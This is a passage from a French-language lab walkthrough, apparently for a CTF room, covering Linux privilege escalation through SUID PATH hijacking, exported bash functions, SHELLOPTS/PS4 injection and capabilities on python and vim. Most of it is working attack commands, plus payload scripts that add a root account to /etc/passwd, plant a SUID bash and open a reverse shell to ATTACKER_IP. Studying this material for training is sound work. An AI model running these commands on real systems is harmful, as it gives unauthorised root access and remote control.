<span id="cb29-11"><a href="#cb29-11" aria-hidden="true" tabindex="-1"></a><span class="ex">strace</span> /path/to/suid-binary <span class="dv">2</span><span class="op">&gt;&amp;</span><span class="dv">1</span> <span class="kw">|</span> <span class="fu">grep</span> exec</span></code></pre></div>
<h3 id="réponse-11"> Réponse</h3>
<p>Shell root obtenu via exploitation de symlink/PATH</p>
<hr />
<h2
id="task-13---privilege-escalation---suid-environment-variables-1"><a name="task-13"></a>Task
13 - Privilege Escalation - SUID (Environment Variables #1)</h2>
<h3 id="objectif-12"> Objectif</h3>
<p>Exploiter un binaire SUID qui utilise des chemins relatifs pour
appeler d’autres programmes.</p>
<h3 id="commandes-12"> Commandes</h3>
<div class="sourceCode" id="cb30"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Trouver le binaire SUID vulnérable</span></span>
<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-type</span> f <span class="at">-perm</span> <span class="at">-04000</span> <span class="at">-ls</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /usr/local/bin/suid-env</span>
<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-5"><a href="#cb30-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Analyser le binaire avec strings</span></span>
<span id="cb30-6"><a href="#cb30-6" aria-hidden="true" tabindex="-1"></a><span class="fu">strings</span> /usr/local/bin/suid-env</span>
<span id="cb30-7"><a href="#cb30-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-8"><a href="#cb30-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Sortie typique:</span></span>
<span id="cb30-9"><a href="#cb30-9" aria-hidden="true" tabindex="-1"></a><span class="co"># service apache2 start</span></span>
<span id="cb30-10"><a href="#cb30-10" aria-hidden="true" tabindex="-1"></a><span class="co"># (appelle &quot;service&quot; sans chemin absolu)</span></span>
<span id="cb30-11"><a href="#cb30-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-12"><a href="#cb30-12" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Vérifier le code source (si disponible)</span></span>
<span id="cb30-13"><a href="#cb30-13" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /home/user/tools/suid/suid-env.c</span>
<span id="cb30-14"><a href="#cb30-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-15"><a href="#cb30-15" aria-hidden="true" tabindex="-1"></a><span class="co"># Code vulnérable typique:</span></span>
<span id="cb30-16"><a href="#cb30-16" aria-hidden="true" tabindex="-1"></a><span class="co"># system(&quot;service apache2 start&quot;);</span></span>
<span id="cb30-17"><a href="#cb30-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-18"><a href="#cb30-18" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Créer un faux &quot;service&quot; malveillant</span></span>
<span id="cb30-19"><a href="#cb30-19" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /tmp/service <span class="op">&lt;&lt; EOF</span></span>
<span id="cb30-20"><a href="#cb30-20" aria-hidden="true" tabindex="-1"></a><span class="st">#!/bin/bash</span></span>
<span id="cb30-21"><a href="#cb30-21" aria-hidden="true" tabindex="-1"></a><span class="st">/bin/bash -p</span></span>
<span id="cb30-22"><a href="#cb30-22" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb30-23"><a href="#cb30-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-24"><a href="#cb30-24" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Rendre le script exécutable</span></span>
<span id="cb30-25"><a href="#cb30-25" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /tmp/service</span>
<span id="cb30-26"><a href="#cb30-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-27"><a href="#cb30-27" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Modifier le PATH pour inclure /tmp en premier</span></span>
<span id="cb30-28"><a href="#cb30-28" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">PATH</span><span class="op">=</span>/tmp:<span class="va">$PATH</span></span>
<span id="cb30-29"><a href="#cb30-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-30"><a href="#cb30-30" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Vérifier le PATH</span></span>
<span id="cb30-31"><a href="#cb30-31" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="va">$PATH</span></span>
<span id="cb30-32"><a href="#cb30-32" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-33"><a href="#cb30-33" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Exécuter le binaire SUID</span></span>
<span id="cb30-34"><a href="#cb30-34" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/local/bin/suid-env</span></span>
<span id="cb30-35"><a href="#cb30-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-36"><a href="#cb30-36" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Vous devriez avoir un shell root</span></span>
<span id="cb30-37"><a href="#cb30-37" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb30-38"><a href="#cb30-38" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb30-39"><a href="#cb30-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-40"><a href="#cb30-40" aria-hidden="true" tabindex="-1"></a><span class="co"># 10. Lire le flag</span></span>
<span id="cb30-41"><a href="#cb30-41" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span>
<span id="cb30-42"><a href="#cb30-42" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-43"><a href="#cb30-43" aria-hidden="true" tabindex="-1"></a><span class="co"># ALTERNATIVE - Si bash est configuré pour utiliser des fonctions</span></span>
<span id="cb30-44"><a href="#cb30-44" aria-hidden="true" tabindex="-1"></a><span class="co"># 11. Créer une fonction bash (ne marche que sur anciennes versions)</span></span>
<span id="cb30-45"><a href="#cb30-45" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span><span class="fu"> /usr/sbin/service</span> <span class="kw">{</span> <span class="ex">/bin/bash</span> <span class="at">-p</span><span class="kw">;</span> <span class="kw">}</span></span>
<span id="cb30-46"><a href="#cb30-46" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="at">-f</span> /usr/sbin/service</span>
<span id="cb30-47"><a href="#cb30-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-48"><a href="#cb30-48" aria-hidden="true" tabindex="-1"></a><span class="co"># 12. Exécuter le binaire</span></span>
<span id="cb30-49"><a href="#cb30-49" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/local/bin/suid-env</span></span></code></pre></div>
<h3 id="analyse-détaillée"> Analyse détaillée</h3>
<p><strong>Vérifier les appels de programmes :</strong></p>
<div class="sourceCode" id="cb31"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Avec ltrace</span></span>
<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ltrace</span> /usr/local/bin/suid-env <span class="dv">2</span><span class="op">&gt;&amp;</span><span class="dv">1</span> <span class="kw">|</span> <span class="fu">grep</span> system</span>
<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Avec strace</span></span>
<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a><span class="ex">strace</span> <span class="at">-f</span> /usr/local/bin/suid-env <span class="dv">2</span><span class="op">&gt;&amp;</span><span class="dv">1</span> <span class="kw">|</span> <span class="fu">grep</span> execve</span>
<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Résultat attendu:</span></span>
<span id="cb31-8"><a href="#cb31-8" aria-hidden="true" tabindex="-1"></a><span class="co"># execve(&quot;/usr/bin/service&quot;, [&quot;service&quot;, &quot;apache2&quot;, &quot;start&quot;], ...) = 0</span></span></code></pre></div>
<p><strong>Vérifier le code source :</strong></p>
<div class="sourceCode" id="cb32"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Code vulnérable</span></span>
<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a>    setuid<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a>    system<span class="op">(</span><span class="st">&quot;service apache2 start&quot;</span><span class="op">);</span>  <span class="co">// Chemin relatif!</span></span>
<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p><strong>Code sécurisé :</strong></p>
<div class="sourceCode" id="cb33"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Code sécurisé</span></span>
<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a>    setuid<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a>    system<span class="op">(</span><span class="st">&quot;/usr/sbin/service apache2 start&quot;</span><span class="op">);</span>  <span class="co">// Chemin absolu</span></span>
<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h3 id="scripts-malveillants-variés"> Scripts malveillants variés</h3>
<p><strong>Shell bash simple :</strong></p>
<div class="sourceCode" id="cb34"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/bin/bash</span> <span class="at">-p</span></span></code></pre></div>
<p><strong>Ajouter un utilisateur root :</strong></p>
<div class="sourceCode" id="cb35"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;hacker:$1$xyz$F3QzWGa8D0rEJBiOC8kNm0:0:0:root:/root:/bin/bash&#39;</span> <span class="op">&gt;&gt;</span> /etc/passwd</span></code></pre></div>
<p><strong>Copier /bin/bash et set SUID :</strong></p>
<div class="sourceCode" id="cb36"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /bin/bash /tmp/rootbash</span>
<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +s /tmp/rootbash</span></code></pre></div>
<p><strong>Reverse shell :</strong></p>
<div class="sourceCode" id="cb37"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> <span class="at">-i</span> <span class="op">&gt;&amp;</span> /dev/tcp/ATTACKER_IP/4444 <span class="dv">0</span><span class="op">&gt;&amp;</span><span class="dv">1</span></span></code></pre></div>
<h3 id="réponse-12"> Réponse</h3>
<p>Shell root obtenu via manipulation du PATH</p>
<hr />
<h2
id="task-14---privilege-escalation---suid-environment-variables-2"><a name="task-14"></a>Task
14 - Privilege Escalation - SUID (Environment Variables #2)</h2>
<h3 id="objectif-13"> Objectif</h3>
<p>Exploiter un binaire SUID qui utilise des chemins absolus mais peut
être trompé via la fonction bash.</p>
<h3 id="commandes-13"> Commandes</h3>
<div class="sourceCode" id="cb38"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Trouver le binaire SUID</span></span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /usr/local/bin/suid-env2</span>
<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Analyser avec strings</span></span>
<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a><span class="fu">strings</span> /usr/local/bin/suid-env2</span>
<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Sortie:</span></span>
<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a><span class="co"># /usr/sbin/service apache2 start</span></span>
<span id="cb38-9"><a href="#cb38-9" aria-hidden="true" tabindex="-1"></a><span class="co"># (Cette fois c&#39;est un chemin absolu!)</span></span>
<span id="cb38-10"><a href="#cb38-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-11"><a href="#cb38-11" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Vérifier le code source</span></span>
<span id="cb38-12"><a href="#cb38-12" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /home/user/tools/suid/suid-env2.c</span>
<span id="cb38-13"><a href="#cb38-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-14"><a href="#cb38-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Code:</span></span>
<span id="cb38-15"><a href="#cb38-15" aria-hidden="true" tabindex="-1"></a><span class="co"># system(&quot;/usr/sbin/service apache2 start&quot;);</span></span>
<span id="cb38-16"><a href="#cb38-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-17"><a href="#cb38-17" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. MÉTHODE 1 - Bash Function Exploit (bash &lt; 4.2-048)</span></span>
<span id="cb38-18"><a href="#cb38-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Créer une fonction bash avec le nom du chemin complet</span></span>
<span id="cb38-19"><a href="#cb38-19" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span><span class="fu"> /usr/sbin/service</span> <span class="kw">{</span> <span class="ex">/bin/bash</span> <span class="at">-p</span><span class="kw">;</span> <span class="kw">}</span></span>
<span id="cb38-20"><a href="#cb38-20" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="at">-f</span> /usr/sbin/service</span>
<span id="cb38-21"><a href="#cb38-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-22"><a href="#cb38-22" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Exécuter le binaire</span></span>
<span id="cb38-23"><a href="#cb38-23" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/local/bin/suid-env2</span></span>
<span id="cb38-24"><a href="#cb38-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-25"><a href="#cb38-25" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. MÉTHODE 2 - Bash Shell Options (bash &lt; 4.4)</span></span>
<span id="cb38-26"><a href="#cb38-26" aria-hidden="true" tabindex="-1"></a><span class="co"># Utiliser la variable ENV</span></span>
<span id="cb38-27"><a href="#cb38-27" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;/bin/bash -p&#39;</span> <span class="op">&gt;</span> /tmp/shell.sh</span>
<span id="cb38-28"><a href="#cb38-28" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /tmp/shell.sh</span>
<span id="cb38-29"><a href="#cb38-29" aria-hidden="true" tabindex="-1"></a><span class="fu">env</span> <span class="at">-i</span> SHELLOPTS=xtrace PS4=<span class="st">&#39;$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)&#39;</span> /usr/local/bin/suid-env2</span>
<span id="cb38-30"><a href="#cb38-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-31"><a href="#cb38-31" aria-hidden="true" tabindex="-1"></a><span class="co"># Puis exécuter le bash SUID créé</span></span>
<span id="cb38-32"><a href="#cb38-32" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp/rootbash</span> <span class="at">-p</span></span>
<span id="cb38-33"><a href="#cb38-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-34"><a href="#cb38-34" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. MÉTHODE 3 - Si Bash Debug est activé</span></span>
<span id="cb38-35"><a href="#cb38-35" aria-hidden="true" tabindex="-1"></a><span class="fu">env</span> <span class="at">-i</span> SHELLOPTS=xtrace PS4=<span class="st">&#39;$(/bin/bash -p)&#39;</span> /usr/local/bin/suid-env2</span>
<span id="cb38-36"><a href="#cb38-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-37"><a href="#cb38-37" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Vérifier que vous êtes root</span></span>
<span id="cb38-38"><a href="#cb38-38" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb38-39"><a href="#cb38-39" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb38-40"><a href="#cb38-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-41"><a href="#cb38-41" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Lire le flag</span></span>
<span id="cb38-42"><a href="#cb38-42" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span>
<span id="cb38-43"><a href="#cb38-43" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-44"><a href="#cb38-44" aria-hidden="true" tabindex="-1"></a><span class="co"># VÉRIFICATION DE LA VERSION BASH</span></span>
<span id="cb38-45"><a href="#cb38-45" aria-hidden="true" tabindex="-1"></a><span class="co"># 10. Vérifier si vulnerable</span></span>
<span id="cb38-46"><a href="#cb38-46" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> <span class="at">--version</span></span>
<span id="cb38-47"><a href="#cb38-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-48"><a href="#cb38-48" aria-hidden="true" tabindex="-1"></a><span class="co"># Versions vulnérables:</span></span>
<span id="cb38-49"><a href="#cb38-49" aria-hidden="true" tabindex="-1"></a><span class="co"># &lt; 4.2-048 (Function exploit)</span></span>
<span id="cb38-50"><a href="#cb38-50" aria-hidden="true" tabindex="-1"></a><span class="co"># &lt; 4.4 (SHELLOPTS exploit)</span></span></code></pre></div>
<h3 id="explication-des-méthodes"> Explication des méthodes</h3>
<p><strong>1. Bash Function Export (CVE-2014-6271 - Shellshock)
:</strong></p>
<div class="sourceCode" id="cb39"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Bash &lt; 4.2-048 permet d&#39;exporter des fonctions</span></span>
<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="co"># qui peuvent remplacer des commandes système</span></span>
<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span><span class="fu"> /usr/sbin/service</span> <span class="kw">{</span> <span class="ex">/bin/bash</span> <span class="at">-p</span><span class="kw">;</span> <span class="kw">}</span></span>
<span id="cb39-5"><a href="#cb39-5" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="at">-f</span> /usr/sbin/service</span>
<span id="cb39-6"><a href="#cb39-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-7"><a href="#cb39-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Quand le binaire appelle /usr/sbin/service,</span></span>
<span id="cb39-8"><a href="#cb39-8" aria-hidden="true" tabindex="-1"></a><span class="co"># il exécute notre fonction bash au lieu</span></span></code></pre></div>
<p><strong>2. SHELLOPTS + PS4 :</strong></p>
<div class="sourceCode" id="cb40"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="co"># SHELLOPTS=xtrace active le mode debug</span></span>
<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a><span class="co"># PS4 définit le prompt de debug qui est exécuté</span></span>
<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a><span class="fu">env</span> <span class="at">-i</span> SHELLOPTS=xtrace PS4=<span class="st">&#39;$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)&#39;</span> /usr/local/bin/suid-env2</span>
<span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-6"><a href="#cb40-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Les commandes dans PS4 sont exécutées avec les privilèges du binaire SUID</span></span></code></pre></div>
<p><strong>3. Variables d’environnement bash :</strong></p>
<div class="sourceCode" id="cb41"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="co"># ENV - Fichier source à l&#39;initialisation</span></span>
<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a><span class="co"># BASH_ENV - Similaire à ENV</span></span>
<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a><span class="co"># PS4 - Prompt de debug</span></span>
<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a><span class="co"># SHELLOPTS - Options du shell</span></span></code></pre></div>
<h3 id="tests-de-vulnérabilité"> Tests de vulnérabilité</h3>
<div class="sourceCode" id="cb42"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Test Shellshock</span></span>
<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a><span class="fu">env</span> x=<span class="st">&#39;() { :;}; echo vulnerable&#39;</span> bash <span class="at">-c</span> <span class="st">&quot;echo test&quot;</span></span>
<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-4"><a href="#cb42-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Si affiche &quot;vulnerable&quot;, la version est vulnérable</span></span>
<span id="cb42-5"><a href="#cb42-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-6"><a href="#cb42-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Test function export</span></span>
<span id="cb42-7"><a href="#cb42-7" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span><span class="fu"> /tmp/test</span> <span class="kw">{</span> <span class="bu">echo</span> <span class="st">&quot;function works&quot;</span><span class="kw">;</span> <span class="kw">}</span></span>
<span id="cb42-8"><a href="#cb42-8" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="at">-f</span> /tmp/test</span>
<span id="cb42-9"><a href="#cb42-9" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> <span class="at">-c</span> <span class="st">&#39;/tmp/test&#39;</span></span>
<span id="cb42-10"><a href="#cb42-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-11"><a href="#cb42-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Si affiche &quot;function works&quot;, l&#39;export fonctionne</span></span></code></pre></div>
<h3 id="versions-de-bash-vulnérables"> Versions de Bash
vulnérables</h3>
<table>
<thead>
<tr class="header">
<th>Version</th>
<th>Vulnérabilité</th>
<th>CVE</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>&lt; 4.2-048</td>
<td>Function export</td>
<td>-</td>
</tr>
<tr class="even">
<td>&lt; 4.3</td>
<td>Shellshock</td>
<td>CVE-2014-6271</td>
</tr>
<tr class="odd">
<td>&lt; 4.4</td>
<td>SHELLOPTS/PS4</td>
<td>-</td>
</tr>
</tbody>
</table>
<h3 id="réponse-13"> Réponse</h3>
<p>Shell root obtenu via exploitation de fonctions bash</p>
<hr />
<h2
id="task-15---privilege-escalation---capabilities"><a name="task-15"></a>Task
15 - Privilege Escalation - Capabilities</h2>
<h3 id="objectif-14"> Objectif</h3>
<p>Exploiter les capabilities Linux pour l’escalade de privilèges.</p>
<h3 id="commandes-14"> Commandes</h3>
<div class="sourceCode" id="cb43"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Lister tous les binaires avec capabilities</span></span>
<span id="cb43-2"><a href="#cb43-2" aria-hidden="true" tabindex="-1"></a><span class="ex">getcap</span> <span class="at">-r</span> / <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb43-3"><a href="#cb43-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-4"><a href="#cb43-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Sortie typique:</span></span>
<span id="cb43-5"><a href="#cb43-5" aria-hidden="true" tabindex="-1"></a><span class="co"># /usr/bin/python2.7 = cap_setuid+ep</span></span>
<span id="cb43-6"><a href="#cb43-6" aria-hidden="true" tabindex="-1"></a><span class="co"># /usr/bin/vim = cap_setuid+ep</span></span>
<span id="cb43-7"><a href="#cb43-7" aria-hidden="true" tabindex="-1"></a><span class="co"># /usr/bin/perl = cap_setuid+ep</span></span>
<span id="cb43-8"><a href="#cb43-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-9"><a href="#cb43-9" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. MÉTHODE PYTHON avec cap_setuid</span></span>
<span id="cb43-10"><a href="#cb43-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Si Python a cap_setuid+ep</span></span>
<span id="cb43-11"><a href="#cb43-11" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/python2.7</span> <span class="at">-c</span> <span class="st">&#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</span></span>
<span id="cb43-12"><a href="#cb43-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-13"><a href="#cb43-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Ou Python3</span></span>
<span id="cb43-14"><a href="#cb43-14" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/python3</span> <span class="at">-c</span> <span class="st">&#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</span></span>
<span id="cb43-15"><a href="#cb43-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-16"><a href="#cb43-16" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. MÉTHODE VIM avec cap_setuid</span></span>
<span id="cb43-17"><a href="#cb43-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Si Vim a cap_setuid+ep</span></span>
<span id="cb43-18"><a href="#cb43-18" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/vim</span> <span class="at">-c</span> <span class="st">&#39;:py3 import os; os.setuid(0); os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-c&quot;, &quot;reset; exec bash&quot;)&#39;</span></span>
<span id="cb43-19"><a href="#cb43-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-20"><a href="#cb43-20" aria-hidden="true" tabindex="-1"></a><span class="co"># Ou</span></span>
<span id="cb43-21"><a href="#cb43-21" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/vim</span> <span class="at">-c</span> <span class="st">&#39;:lua os.execute(&quot;reset; exec bash&quot;)&#39;</span></span>
<span id="cb43-22"><a href="#cb43-22" aria-hidden="true" tabindex="-1"></a></span>
